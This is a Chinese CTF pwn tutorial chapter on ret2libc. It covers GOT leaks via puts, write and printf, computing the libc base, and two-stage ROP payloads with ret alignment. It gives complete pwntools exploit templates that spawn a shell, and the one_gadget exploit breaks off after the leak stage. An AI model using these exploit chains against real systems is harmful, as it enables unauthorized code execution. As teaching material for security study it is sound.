# 05 ret2libc

> 本章是全套知识库的**核心枢纽章**：ret2text（02）没有后门可跳时、ret2shellcode（03）被 NX 挡住时、ret2syscall（04）凑不齐 `execve` 寄存器时，最后都会走到这里。请务必把 5.4 的"两段式"模板练到肌肉记忆。

## 本章速览

| 小节 | 主题 | 一句话要点 |
| ---- | ---- | ---------- |
| 5.1 | 定义与判定 | 动态链接 + NX 开启 + 无后门 → 去 libc 里"借" system |
| 5.2 | 泄露 libc 地址 | puts(puts@got)、write(1,got,8)、printf("%s")、__libc_start_main 返回地址四大原语 |
| 5.3 | 计算 base | LibcSearcher、libc-database、题目自带 libc；低 12 位不变原理 |
| 5.4 | 两段式 payload | 第一轮 leak + 回 main，第二轮 system("/bin/sh")；64 位栈对齐详解 |
| 5.5 | one_gadget 专题 | libc 内嵌 execve("/bin/sh",...)，读懂约束、gdb 验证、垫 gadget |
| 5.6 | 部分覆盖 | 页对齐 → 只改低 2 字节爆破 1/16、低 3 字节 1/4096 |
| 5.7 | 题目给了 libc | patchelf --set-interpreter / --replace-needed、LD_PRELOAD |
| 5.8 | execve 代替 system | 纯系统调用封装 vs fork + sh -c；构造 execve 链 |
| 5.9 | 变体与扩展 | 栈迁移、一次溢出 leak+执行、environ 泄露栈、printf 泄露、替代输出原语 |
| 5.10 | 典型例题 | 4 道全流程：伪代码、checksec、手算偏移、完整 exp |
| 5.11 | 常见坑 | recvline 没收全、libc 不一致、栈未对齐、PLT/GOT 混淆等 8 坑 |
| 5.12 | 检查清单 | 赛场上逐项自检 |

前置知识：[01 基础知识与工具链](01-基础知识与工具链.md)（checksec、pwntools、IDA 定位偏移）、[02 ret2text](02-ret2text.md)（栈图阅读、后门函数）。

---

## 5.1 ret2libc 定义与判定

### 5.1.1 什么是 ret2libc

**ret2libc**（return-to-libc）：利用栈溢出控制返回地址，使程序跳到 **libc 动态库中的函数**（通常是 `system`、`execve`，或 one_gadget），从而获得 shell 或执行任意命令。

它和 ret2text 的唯一区别：**跳转目标从"程序自己的代码"换成了"libc 里的代码"**。

```text
ret2text：  返回地址 → 程序内的 backdoor()          （地址固定，直接写死）
ret2libc：  返回地址 → libc 内的 system()           （地址随 ASLR 变化，必须先泄露/计算）
```

### 5.1.2 什么时候轮到 ret2libc（判定流程）

拿到一道栈溢出题，按下面流程走：

```text
发现栈溢出
   │
   ├─ 程序自带后门 / 已有 system("/bin/sh") 调用？ ──是──→ ret2text（02 章）
   │
   ├─ NX 关闭（栈可执行）？                        ──是──→ ret2shellcode（03 章）
   │
   ├─ 是动态链接吗？（ldd pwn 能看到 libc.so.6）    ──否──→ 静态：ret2syscall / 纯 ROP（04、07 章）
   │
   └─ 是 → ret2libc（本章）
           泄露 libc 地址 → 算 libc_base → 调 system / execve / one_gadget
```

三个判定要点：

1. **动态链接**：`ldd ./pwn` 能看到 libc；checksec 无 "statically linked" 字样。静态链接的程序里本来就有全部 gadget，直接打 ROP（04/07 章）。
2. **NX 开启**：栈上数据不可执行，ret2shellcode 报废，只能跳"现成代码"。
3. **程序无 backdoor**：程序里没有 `system("/bin/sh")` 可跳，但 libc 里有。

### 5.1.3 核心思想："libc 里什么都有"

libc 是一个几 MB 的动态库，攻击需要的材料几乎全在里面：

| 材料 | 说明 | 获取方式 |
| ---- | ---- | -------- |
| `system` 函数 | 执行 `sh -c "命令"` | `libc.sym['system']` / LibcSearcher |
| `execve` 函数 | 纯系统调用封装，直接换进程映像 | `libc.sym['execve']` |
| `"/bin/sh"` 字符串 | libc 自带，无需自己构造 | `next(libc.search(b'/bin/sh\x00'))` |
| one_gadget | 一条满足约束即可 getshell 的内嵌代码 | `one_gadget libc.so.6` 工具 |
| `environ` 变量 | 存着栈上环境变量区指针 → 泄露栈地址 | `libc.sym['environ']` |
| `puts/write/printf` 真实地址 | 它们自己就是"泄露源" | 读 GOT 表 |

而这一切的前提是知道 **libc 的加载基址**——这就是 ret2libc 的全部难点。

### 5.1.4 地址计算公式（本章最重要的两行）

```text
libc_base   = leaked_addr - 符号偏移        # 泄露的运行时地址 - 该符号在 libc 文件里的偏移
target_addr = libc_base   + 目标符号偏移    # 基址 + 目标符号偏移 = 目标运行时地址
```

手算示例（glibc 2.27，puts 偏移 0x809c0，system 偏移 0x4f440）：

```text
第一轮泄露得到：leaked_puts = 0x7f6d8a2a49c0
libc_base     = 0x7f6d8a2a49c0 - 0x000809c0 = 0x7f6d8a224000
system_addr   = 0x7f6d8a224000 + 0x0004f440 = 0x7f6d8a273440
```

自检习惯：算出的 `libc_base` **低 12 位必须全 0**（页对齐），不为 0 说明泄露收错或偏移用错。写 exp 时加一句：

```python
assert libc_base & 0xfff == 0, 'base 低 12 位应全 0 —— 泄露接收或偏移有误'
```

注意区分两种"地址"：泄露出来的是**运行时地址**（0x7f... / 0xf7...），而 `ELF('libc.so.6').sym['puts']`、`LibcSearcher.dump('puts')` 给的是**偏移**（0x809c0 这种小数字）。相减/相加别搞反（对应 5.11 坑 7）。

### 5.1.5 checksec 快速判读（ret2libc 视角）

```text
    RELRO:    Partial RELRO      ← GOT 可写且延迟绑定：泄露必须选"已调用过"的函数；GOT 还能改写
    Stack:    No canary found    ← 无需处理 canary，直接溢出返回地址
    NX:       NX enabled         ← shellcode 不可行 → 指向 ret2libc
    PIE:      No PIE (0x400000)  ← 程序段地址固定：pop rdi 等 gadget 地址可直接写死
```

| 保护 | 对 ret2libc 的影响 |
| ---- | ------------------ |
| NX enabled | shellcode 不可行，是使用 ret2libc 的前提之一 |
| Canary found | 需先泄露 canary（见 08/09 章）或从低位覆盖，否则溢出无效 |
| PIE enabled | 程序自身的 plt/gadget 地址也随机，需先泄程序基址再算 gadget |
| Partial RELRO | GOT 延迟绑定：泄露目标必须是**至少被调用过一次**的函数 |
| Full RELRO | GOT 启动即全解析，泄露任意条目均可；但 GOT 不可改写 |

---

## 5.2 泄露 libc 地址的完整方法学

为什么要泄露：Linux 开启 ASLR 后，libc 每次加载基址随机（x64 mmap 区域约 28 位熵），payload 在发送前就写死了，**"先泄露、再用泄露值"无法在同一个 payload 里完成**（严格意义上的例外见 5.9.2），所以标准打法是两轮（5.4）。本轮先解决"怎么泄"。

### 5.2.1 方法一：puts(puts@got) —— 最经典

**原理**：GOT 表的条目里存着 libc 函数的**运行时真实地址**。用程序自己的 `puts@plt` 去打印 `puts@got` 这块内存，就等于把 libc 地址读了出来。

**puts 的输出特性**（决定接收方式）：

- 从参数地址开始打印，**遇到 `\x00` 停止**，末尾自动补一个 `\n`；
- 64 位 GOT 条目 8 字节，形如 `0x00007fxxxxxxxxxx`，小端存放为 `xx xx xx xx xx 7f 00 00`——高 2 字节是 0，所以 puts 恰好打印 **6 个字节**；
- 接收时用 `u64(recv行.ljust(8, b'\x00'))` 把 6 字节补齐成 8 字节再解析。

**利用条件**：

1. 程序导入了 puts（有 `puts@plt`），或有其他输出函数（见 5.9.5）；
2. 溢出能控制返回地址（本次）；
3. 有 `pop rdi; ret` gadget（64 位传参需要）。

**选哪个 GOT 条目？三条原则**：

1. **必须是已解析的条目**。Partial RELRO 下 GOT 延迟绑定，函数第一次被调用前，GOT 里存的是 `plt+6`（自己的程序地址）而非 libc 地址——泄露它算 base 必错。所以选 main 执行路径上**必然调用过**的：`puts`、`printf`、`read`、`setvbuf` 等。Full RELRO 启动即全解析，任意条目都行。
2. 调用 `puts(puts@got)` 本身就会解析 puts 的 GOT，所以**泄露 puts 自己是安全的**（泄露执行时该条目已被解析——因为程序此前大多输出过；若程序从头到尾没调过 puts，可换 read/printf，或在第一轮先触发）。
3. 尽量选**低字节非 0** 的符号：若符号偏移低字节恰好是 0x00，puts 只打印 5 字节，接收补零会算错 base（此时改用 write 全量读，见 5.2.2）。

**64 位完整栈图**：

```text
低地址
+----------------------+ ← buf 起点（溢出源）
|      填充 offset     |   offset = buf 距返回地址的字节数（IDA: buf 在 rbp-X → X+8）
+----------------------+
|    pop rdi ; ret     |   ← 返回地址：先弹参
+----------------------+
|     puts@got         |   → 被弹进 rdi（第一个参数 = 要打印的内存地址）
+----------------------+
|     puts@plt         |   ret 到这里 = 执行 puts(rdi)
+----------------------+
|   main / vuln 地址   |   puts 的返回地址 → 回主流程，等第二轮输入
+----------------------+
高地址
```

**64 位 exp 片段**：

```python
pop_rdi = 0x40123b                      # ROPgadget --binary pwn | grep ': pop rdi ; ret'
payload  = b'a' * offset                # 填充到返回地址
payload += p64(pop_rdi)                 # 弹栈 → rdi
payload += p64(elf.got['puts'])         # rdi = puts 的 GOT 条目地址
payload += p64(elf.plt['puts'])         # 调用 puts(rdi)：打印 libc 里 puts 的真实地址
payload += p64(elf.sym['main'])         # 打印完回 main，准备第二轮
io.sendlineafter(b'> ', payload)        # 提示符按题目调整

leak = u64(io.recvline().strip().ljust(8, b'\x00'))   # 6 字节地址 + \n → 补 0 到 8 字节
```

**32 位栈图**（cdecl，参数走栈，不需要 gadget）：

```text
低地址
+----------------------+
|      填充 offset     |   offset = buf 距返回地址（IDA: rbp-X → X+4）
+----------------------+
|      puts@plt        |   ← 返回地址 = 要调用的函数
+----------------------+
|      main 地址       |   ← puts 的"假返回地址"：调用完去哪（兼作下一跳，见 5.4.4）
+----------------------+
|      puts@got        |   ← puts 的参数 1
+----------------------+
高地址
```

```python
payload  = b'a' * offset
payload += p32(elf.plt['puts'])
payload += p32(elf.sym['main'])         # 假返回地址填 main
payload += p32(elf.got['puts'])         # 参数：要打印的地址
leak = u32(io.recvline().strip().ljust(4, b'\x00'))   # 32 位地址 4 字节
```

### 5.2.2 方法二：write(1, got, 8) —— 无截断、无换行

**原理**：`write(fd, buf, count)` 精确输出 count 字节——**不因 `\x00` 截断、不补 `\n`**，把 GOT 条目原样 8 字节（64 位）/ 4 字节（32 位）搬出来。适合：① GOT 条目里含 `\x00` 导致 puts 泄露不完整的场合；② 程序只有 `write`/`read` 没有 puts 的场合（经典 32 位题）。

**利用条件**：有 `write@plt`；32 位 cdecl 直接压参最顺；64 位需要控制 rdi/rsi/rdx 三个寄存器（rdx 的 gadget 较难找，见 5.9.5 替代）。

**32 位栈图**：

```text
低地址
+----------------------+
|      填充 offset     |
+----------------------+
|      write@plt       |   ← 返回地址：执行 write
+----------------------+
|     vuln 地址        |   ← write 的假返回地址：打完回 vuln 再来一轮
+----------------------+
|          1           |   ← 参数1：fd = 1（stdout）
+----------------------+
|     write@got        |   ← 参数2：要打印的地址
+----------------------+
|          4           |   ← 参数3：count（32 位地址 4 字节；64 位写 8）
+----------------------+
高地址
```

**exp 片段（32 位）**：

```python
payload  = b'a' * offset
payload += p32(elf.plt['write'])
payload += p32(elf.sym['vuln'])         # write 返回后回 vuln（第二次 read）
payload += p32(1)                       # fd
payload += p32(elf.got['write'])        # buf = write 的 GOT 条目
payload += p32(4)                       # count
io.sendline(payload)

leak = u32(io.recv(4))                  # 原样 4 字节，直接收 4 字节（注意没有 \n）
```

**64 位 exp 片段**（需要 rdi=1、rsi=got、rdx=8）：

```python
pop_rsi_r15 = 0x4005f1                  # 'pop rsi ; pop r15 ; ret'（__libc_csu_init 尾部常见）
pop_rdx     = 0x4005f5                  # 若没有纯 pop rdx，见 07 章 ret2csu 路线
payload  = b'a' * offset
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(elf.got['write']) + p64(0)
payload += p64(pop_rdx) + p64(8)
payload += p64(elf.plt['write'])
payload += p64(elf.sym['main'])
io.sendline(payload)

leak = u64(io.recv(8))                  # 8 字节原样输出，直接收 8 字节
```

### 5.2.3 方法三：printf("%s", got) —— 与格式化字符串联动

**原理**：调用 `printf@plt`，格式串用 `"%s"`、参数给 GOT 地址，效果与 puts 类似（遇 `\x00` 停），但**不自动补 `\n`**，接收方式不同。

**利用条件**：有 `printf@plt`；二进制里能找到一个现成的 `"%s"` 字符串（`strings pwn | grep '%s'`），或者先用 `read@plt` 把 `"%s\0"` 写进 bss；64 位需要 rdi（格式串）+ rsi（GOT 地址）。

**exp 片段（64 位）**：

```python
fmt = next(elf.search(b'%s\x00'))       # 在二进制里找现成的 "%s" 字符串
payload  = b'a' * offset
payload += p64(pop_rdi) + p64(fmt)              # rdi = "%s"
payload += p64(pop_rsi_r15) + p64(elf.got['puts']) + p64(0)   # rsi = puts@got
payload += p64(elf.plt['printf'])
payload += p64(elf.sym['main'])
io.sendline(payload)

leak = u64(io.recv(6))                  # printf 无换行：printf("%s") 遇 \x00 停 → 收 6 字节
```

格式化字符串本身还能直接任意读栈/任意内存（`%k$s`、`%k$p`），那是 08 章的主战场；本章只把它当作 ret2libc 的泄露原语之一。

### 5.2.4 方法四：泄露 `__libc_start_main` 的返回地址

**原理**：main 不是程序起点，它由 libc 的 `__libc_start_main` 调用。因此 **main 栈帧的返回地址天然就是 libc 里的地址**（`__libc_start_main + X`）。只要能读到栈上这个位置，无需触发任何函数调用就能拿到 libc 地址——特别适合**格式化字符串漏洞**（栈上任意读）开局。

```text
栈（低地址在上，高地址在下）：
低地址
+------------------------------------+
| main 的局部变量 / 漏洞 buf           |
+------------------------------------+
| saved rbp                          |
+------------------------------------+
| 返回地址 = __libc_start_main + X    |  ← main 被 ret 时跳回 libc，这就是泄露目标
+------------------------------------+
| __libc_start_main 的栈帧 ...        |
+------------------------------------+
高地址
```

**X（即 `__libc_start_main + 偏移差`）因 libc 版本而异**（如 Ubuntu 18.04 glibc 2.27 上常见 `__libc_start_main+243`），必须用 gdb 实测：

```text
gdb ./pwn
b *main
run
x/40gx $rsp            # 找 0x7f 开头、值落在 libc 区间的槽位
info proc mappings     # 对照 libc 基址，X = 泄露值 - libc_base
```

**exp 片段（格式化字符串泄露，64 位）**：

```python
# 先用 %p 序列（配合 cyclic，见 08 章）定位 main 返回地址是格式串的第 k 个参数，此处设 k=25
io.sendline(b'|%25$p|')
leak = int(io.recvuntil(b'|', drop=True), 16)          # 形如 0x7f...

libc_base = leak - (libc.sym['__libc_start_main'] + 243)   # +243 是 2.27 常见值，务必实测！
```

### 5.2.5 泄露原语速查表

| 原语 | 截断 | 换行 | 接收写法 | 适用 |
| ---- | ---- | ---- | -------- | ---- |
| `puts(got)` | 遇 \x00 停 | 补 \n | `u64(io.recvline().strip().ljust(8, b'\x00'))` | 最通用 |
| `write(1, got, 8)` | 不截断 | 无 | `u64(io.recv(8))` | GOT 含 \x00 / 无 puts |
| `printf("%s", got)` | 遇 \x00 停 | 无 | `u64(io.recv(6))` | 有 printf@plt + "%s" |
| fmt `%k$p` / `%k$s` | - | 无 | `int(io.recv..., 16)` | 格式化字符串漏洞（08 章） |
| 泄 `__libc_start_main+X` | - | - | 见 5.2.4 | 无输出函数也可（配合 fmt） |

---

## 5.3 计算 base 的三种途径

### 5.3.1 先讲原理：泄露值低 12 位不变

libc 的映射按**页对齐**（0x1000 = 4096 字节），所以无论 ASLR 怎么随机：

```text
libc_base   的低 12 位 恒为 0x000
运行时地址   = libc_base + 符号偏移
⇒ 运行时地址的低 12 位 == 符号偏移的低 12 位（与随机化无关！）
```

两个直接用途：

1. **识别 libc 版本**：把泄露地址的**末 3 位十六进制**（即低 12 位）拿去查 libc-database，例如 `leak = 0x7f9c3d2a49c0` → 查 `puts` 的低 12 位 `9c0` → 命中 `libc6_2.27-3ubuntu1.x_amd64`；
2. **exp 自检**：算出的 `libc_base & 0xfff == 0`，不等则说明接收/偏移出错。

### 5.3.2 途径一：LibcSearcher（没有 libc 文件时）

```bash
pip install LibcSearcher        # https://github.com/lieanu/LibcSearcher
```

```python
from LibcSearcher import LibcSearcher

lc = LibcSearcher('puts', leak)     # 工具自动用泄露值低 12 位筛选；多个候选会列出让你选
libc_base = leak - lc.dump('puts')  # dump() 返回的是偏移
system    = libc_base + lc.dump('system')
binsh     = libc_base + lc.dump('str_bin_sh')
```

注意：候选列表里**逐个试到成功为止**（换 system 偏移重跑）；新版本 glibc 可能查不到，可手动往库里补文件，或改用 libc-database。

### 5.3.3 途径二：libc-database / libc.blukat.me

- 网页版 <https://libc.blukat.me>：选择符号（如 puts）+ 输入泄露地址**低 12 位**（如 `9c0`），即返回匹配的 libc 版本，页面直接给出 `system`、`str_bin_sh` 等偏移，还能下载对应 `.so` 文件用于本地调试；
- 命令行版 <https://github.com/niklasb/libc-database>：

```bash
./search puts 9c0 system f40    # 按若干符号的低 12 位联合查询，缩小候选
./identify ./libc.so.6          # 手头已有 libc 文件时识别其版本 ID
./get libc6_2.27-3ubuntu1.6_amd64   # 下载对应 libc 用于本地复现
```

### 5.3.4 途径三：题目给了 libc 文件 / 本地同版本（最稳）

```python
libc = ELF('./libc.so.6')                       # 直接加载题目给的 libc
libc_base = leak - libc.sym['puts']             # sym[] 给的是偏移
system    = libc_base + libc.sym['system']
binsh     = libc_base + next(libc.search(b'/bin/sh\x00'))
```

铁律：**必须用远程真正在用的那个 libc 文件**。同是 "2.27"，不同 Ubuntu 补丁版本偏移可能不同，随手拿本地 2.27 算偏移打远程是高频翻车点（见 5.7、5.11 坑 2）。用低 12 位交叉验证：

```python
assert (leak & 0xfff) == (libc.sym['puts'] & 0xfff), 'libc 版本可能不匹配！'
```

查看 libc 版本信息：

```bash
file libc.so.6
strings libc.so.6 | grep "GNU C Library"   # 例如：GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.6) ...
```

### 5.3.5 三种途径对比

| 途径 | 前提 | 精度 | 场景 |
| ---- | ---- | ---- | ---- |
| LibcSearcher | 无 libc 文件 | 低 12 位匹配，多候选需试 | 线上赛只给远程 |
| libc-database / blukat | 无 libc 文件 | 低 12 位匹配，可下载 so | 想本地复现时优于 LibcSearcher |
| 题目自带 libc | 有文件 | 完全精确 | 最优先使用 |

---
## 5.4 两段式 payload 标准结构

### 5.4.1 为什么必须"两段"

payload 是在**发送前**写死的。同一个 payload 里"先泄露、再使用泄露值"在逻辑上不可能（程序不会替你做减法）。所以标准结构是：

```text
第一轮输入：溢出 → 泄露 libc 地址 → 返回 main（或 vuln）重新等待输入
    ↓（收到泄露，本地算出 libc_base）
第二轮输入：再次溢出 → system("/bin/sh") 或 one_gadget → getshell
```

两轮之间**不重连**（返回 main 保持了连接与栈的连续性），pwntools 里就是同一条 `io` 连发两个 payload。

### 5.4.2 第一轮：leak + 返回 main

**64 位栈图**：

```text
低地址
+----------------------+ ← buf 起点
|      填充 offset     |   offset = buf 距返回地址（IDA: rbp-X → X+8）
+----------------------+
|    pop rdi ; ret     |
+----------------------+
|     puts@got         |   rdi = 要泄露的 GOT 条目
+----------------------+
|     puts@plt         |   执行 puts(rdi)
+----------------------+
|     main 地址        |   ← 关键：puts 的返回地址填 main，回到主流程等第二轮
+----------------------+
高地址
```

**32 位栈图**：

```text
低地址
+----------------------+
|      填充 offset     |
+----------------------+
|      puts@plt        |   ← 返回地址：调用 puts
+----------------------+
|      main 地址       |   ← puts 的"假返回地址"（32 位返回槽兼作下一跳）
+----------------------+
|      puts@got        |   ← 参数 1
+----------------------+
高地址
```

要点：32 位的"参数表"紧跟在假返回地址后面；假返回地址填 `main`，流程自然回环。

### 5.4.3 第二轮：system("/bin/sh")

**64 位栈图**：

```text
低地址
+----------------------+
|      填充 offset     |
+----------------------+
|      ret gadget      |   ★ 对齐垫片：是否需要见 5.4.4
+----------------------+
|    pop rdi ; ret     |
+----------------------+
|    "/bin/sh" 地址    |   → rdi（libc 里搜出来的）
+----------------------+
|     system 地址      |   libc_base + libc.sym['system']
+----------------------+
高地址
```

**32 位栈图**：

```text
低地址
+----------------------+
|      填充 offset     |
+----------------------+
|     system 地址      |   ← 返回地址：执行 system
+----------------------+
|      0xdeadbeef      |   ← system 的假返回地址：拿到 shell 后不再返回，随便占位
+----------------------+
|    "/bin/sh" 地址    |   ← system 的参数 1
+----------------------+
高地址
```

### 5.4.4 64 位"假返回地址"与栈平衡详解（movaps 崩溃）

**"假返回地址"是什么**：ROP 里我们不是 `call`，而是 `ret` 跳过去。被调函数"以为"栈上留了它的返回地址，于是链上那个槽位就被当成返回地址——32 位里它同时是参数表分隔符，我们随手填（`0xdeadbeef`/`main`/`exit@plt`），故称"假返回地址"。64 位没有参数槽，但 `ret` 弹槽的节奏决定 rsp 落点，与对齐直接相关。

**System V AMD64 ABI 的对齐约定**：

```text
正常调用：call system 之前 rsp % 16 == 0
          call 压入 8 字节返回地址 → system 入口处 rsp % 16 == 8
ROP 跳入：ret 弹走 system 槽位后直接进入 system，rsp % 16 是多少取决于链长
          若进入时 rsp % 16 == 0（与 ABI 期望差 8 字节）→ 出事
```

**崩溃表现**：`system` 内部的 `do_system` 里有 `movaps XMMWORD PTR [rsp+0x50], xmm0` 一类 SSE 指令，要求操作数 16 字节对齐；rsp 差 8 字节时触发 `SIGSEGV`。gdb 里崩在 `do_system+xx` 的 `movaps`，是教科书式的对齐崩溃信号。

**修复三选一**：

1. 在 `system` 槽位前**垫一条纯 `ret` gadget**（链整体平移 8 字节）——最常用；
2. 调整填充长度 ±8 字节（改变 offset，通常不动它，选方案 1）；
3. 从别的返回点进入（第二轮的 rsp 落点本来就和第一轮不同，垫/不垫总有一种对）。

经验法则：**64 位调 `system`/`printf`/`execl` 前习惯性垫一条 `ret`**；32 位无此问题（32 位代码不用 SSE 存栈）。

注意：两轮的 rsp 落点奇偶性可能不同——第一轮链能跑、第二轮崩（或反过来）是正常现象，按上面方法单独调第二轮。

### 5.4.5 完整模板：64 位（逐行注释）

```python
#!/usr/bin/env python3
# ret2libc_two_stage_64.py —— 64 位两段式标准模板
from pwn import *

context.arch = 'amd64'            # 64 位
context.log_level = 'info'        # 收发对不上时改成 'debug' 看原始字节流

io   = process('./pwn')           # 远程改为 remote('1.2.3.4', 9999)
elf  = ELF('./pwn')               # 主程序
libc = ELF('./libc.so.6')         # 题目给的 libc；没有则用 LibcSearcher（见 5.3.2）

# ---- 三个固定资源 ----
pop_rdi = 0x40123b                # ROPgadget --binary pwn | grep ': pop rdi ; ret'
ret_g   = 0x40101a                # 任意一条纯 ret，用于 16 字节栈对齐
main    = elf.sym['main']         # 第二轮返回点
offset  = 0x60 + 8                # IDA: buf 位于 rbp-0x60 → 0x60(局部变量) + 8(saved rbp)

# ================= 第一轮：leak =================
payload1  = b'a' * offset             # 1. 填充到返回地址
payload1 += p64(pop_rdi)              # 2. 弹栈 → rdi
payload1 += p64(elf.got['puts'])      # 3. rdi = puts 的 GOT 条目（存着 libc puts 运行时地址）
payload1 += p64(elf.plt['puts'])      # 4. 执行 puts(rdi)：遇 \x00 截断，打出 6 字节地址
payload1 += p64(main)                 # 5. 打完回 main，等待第二轮输入

io.sendlineafter(b'> ', payload1)     # 提示符按题目实际调整

leak = u64(io.recvline().strip().ljust(8, b'\x00'))   # 6 字节 + \n → 补 0 到 8 字节
libc_base = leak - libc.sym['puts']   # 运行时地址 - 偏移 = 基址
log.success('libc_base = %#x', libc_base)
assert libc_base & 0xfff == 0         # 自检：基址低 12 位必须全 0

# ---- 由基址拼出所有目标 ----
system = libc_base + libc.sym['system']
binsh  = libc_base + next(libc.search(b'/bin/sh\x00'))

# ================= 第二轮：getshell =================
payload2  = b'a' * offset
payload2 += p64(ret_g)                # 垫一条 ret 调整 16 字节对齐（防 movaps 崩溃）
payload2 += p64(pop_rdi)              # rdi = "/bin/sh"
payload2 += p64(binsh)
payload2 += p64(system)               # system("/bin/sh") → shell

io.sendlineafter(b'> ', payload2)
io.interactive()                      # 交互拿 flag
```

### 5.4.6 完整模板：32 位（逐行注释）

```python
#!/usr/bin/env python3
# ret2libc_two_stage_32.py —— 32 位两段式标准模板
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

io  = process('./pwn')
elf = ELF('./pwn')
# 32 位 cdecl：参数从左到右依次压栈。
# 一条"调用+回跳"链的固定形状：[func@plt][返回后去哪][参数1][参数2]...

offset = 0x6c + 4                     # IDA: buf 位于 rbp-0x6c → 0x6c + 4(saved ebp)

# ================= 第一轮：puts 泄露 =================
payload1  = b'a' * offset
payload1 += p32(elf.plt['puts'])      # 返回到 puts —— "调用谁"
payload1 += p32(elf.sym['main'])      # puts 的假返回地址 —— 调用完回 main
payload1 += p32(elf.got['puts'])      # puts 的参数 —— 打印 GOT 里 libc puts 真实地址

io.sendline(payload1)

leak = u32(io.recvline().strip().ljust(4, b'\x00'))   # 4 字节 libc 地址，补零解析
log.success('puts@libc = %#x', leak)

from LibcSearcher import LibcSearcher
lc        = LibcSearcher('puts', leak)    # 没给 libc 文件时的通用做法
libc_base = leak - lc.dump('puts')
assert libc_base & 0xfff == 0
system    = libc_base + lc.dump('system')
binsh     = libc_base + lc.dump('str_bin_sh')

# ================= 第二轮：getshell =================
payload2  = b'a' * offset
payload2 += p32(system)               # 返回到 system
payload2 += p32(0xdeadbeef)           # system 的假返回地址 —— 占位即可
payload2 += p32(binsh)                # system 的参数 —— "/bin/sh"

io.sendline(payload2)
io.interactive()
```

### 5.4.7 两段式的变体与注意点

1. **返回 vuln 而不是 main**：菜单题里 main 有额外输出/分支，直接返回漏洞函数入口往往更稳（少一层收发、偏移不变）。注意返回 vuln 会跳过 main 的菜单逻辑，收发顺序要对应改。
2. **system 返回后还想继续执行**：64 位链在 system 后再接 `p64(exit@plt)` 或 `p64(main)`，让"shell 退出/失败"时流程可控。
3. **payload 里含 `\n` 字节**：`gets`/`scanf`/`fgets` 型输入遇 `\n` 截断，若 gadget/地址字节恰好含 0x0a 要换等价 gadget；`read` 型输入不受影响。
4. **二次溢出偏移可能不同**：返回点不同 → 栈布局不同 → buf 距返回地址可能变化，每轮单独确认（见 5.11 坑 4）。
5. **第一轮与第二轮之间的输出**：菜单、回显、提示符都要用 `recvuntil` 吃干净，否则会把提示符当泄露地址解析（见 5.11 坑 1）。

---

## 5.5 one_gadget 专题

### 5.5.1 原理

libc 里存在若干段这样的代码：直接执行 `execve("/bin/sh", rsp+X, environ)`。它不依赖你搭参数链，只要跳过去时**满足少量约束**，一条地址就能 getshell。one_gadget 工具负责扫描这些位置并列出约束。

对比两段式 `system` 链（需要 pop_rdi + binsh + 对齐），one_gadget 优点：链短（溢出空间小时救命）、无参数构造；缺点：约束可能不满足。

### 5.5.2 安装与输出解读

```bash
# 依赖 ruby
gem install one_gadget
one_gadget ./libc.so.6            # 常规扫描
one_gadget --level 99 ./libc.so.6 # 更宽松的约束也列出来
```

典型输出（glibc 2.23，Ubuntu 16.04）：

```text
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL
  [rsp+0x50] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

输出的是**偏移**，用时加 base：`og = libc_base + 0x45216`。

### 5.5.3 约束条件逐条解读

进入 one_gadget 的瞬间（`ret` 弹走它的槽位后），`rsp` 指向它**下方**的槽位（地址更高的一格）。常见约束：

| 约束 | 含义 | 不满足的后果 |
| ---- | ---- | ------------ |
| `[rsp+0x30] == NULL` | rsp+0x30 处的 8 字节会被当成 `execve` 的 argv，必须是 0 | execve 收到非法 argv → EFAULT，无输出直接崩/退出 |
| `rsp & 0xf == 0`（新版 libc 常见） | 进入时 rsp 16 字节对齐 | 和 5.4.4 的 movaps 问题同源，垫 ret 调整 |
| `r12 == NULL` / `rbx == NULL` 等 | 寄存器约束：进入前该寄存器必须为 0 | ROP 现场寄存器常有脏值，需要 `pop` 清零 gadget |

关键理解：约束检查的是**跳进去那一刻的现场**。返回 main 后再溢出、链上垫 0，都能改变现场。

### 5.5.4 用 gdb 验证约束（实操流程）

```text
1) 本地 gdb ./pwn，先跑第一轮 leak，手算出 libc_base 与 one_gadget 运行时地址 og
2) 在第二轮溢出的 ret 处下断：b *vuln返回处   （或 b *$rebase偏移）
3) 发送第二轮 payload（包含 og），断下后：
     p/x $rsp            # 看当前 rsp
     si                  # 单步执行 ret —— 此时 rip 应等于 og
4) 检查约束：
     x/8gx $rsp+0x30     # 是否全 0？对应 [rsp+0x30] == NULL
     p/x $rsp & 0xf      # 是否为 0？对应 16 字节对齐约束
5) 全满足 → 放心打远程；不满足 → 5.5.5 的处理办法
```

### 5.5.5 约束不满足时的处理

按优先级尝试：

1. **payload 后面补 0**：溢出空间充裕时，在 one_gadget 地址后再接 `p64(0) * N`，让 rsp+0x30 精确落在我们自己写入的 0 上——把"看运气"变成"必然"；
2. **垫/撤一条 `ret`**：改变 rsp 落点（每垫一条，rsp 视角 +8），同时解决对齐类约束；
3. **换候选**：one_gadget 通常有 2~4 个候选，约束不同，逐个验证；
4. **清空环境变量重试（仅本地调试）**：`env -i ./pwn` 改变栈上残留，可能让 [rsp+0x30] 恰好为 0；
5. 实在凑不齐 → 放弃 one_gadget，回 5.4 两段式 `system` 链。

### 5.5.6 one_gadget 完整 exp（64 位，替代 5.4.5 的第二轮）

```python
#!/usr/bin/env python3
# ret2libc_onegadget_64.py —— 第一轮照常 leak，第二轮直接返回 one_gadget
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

io   = process('./pwn')
elf  = ELF('./pwn')
# libc 文件缺省时用 LibcSearcher 求 base，见 5.3.2

pop_rdi = 0x400763
offset  = 0x40 + 8                 # IDA: buf 在 rbp-0x40

# ---------- 第一轮：leak ----------
payload1  = b'a' * offset
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.sym['main'])
io.sendafter(b'input:\n', payload1)

leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc_base = leak - 0x06f690        # 该 libc 的 puts 偏移（以 one_gadget/ELF 实测为准）
assert libc_base & 0xfff == 0
log.success('libc_base = %#x', libc_base)

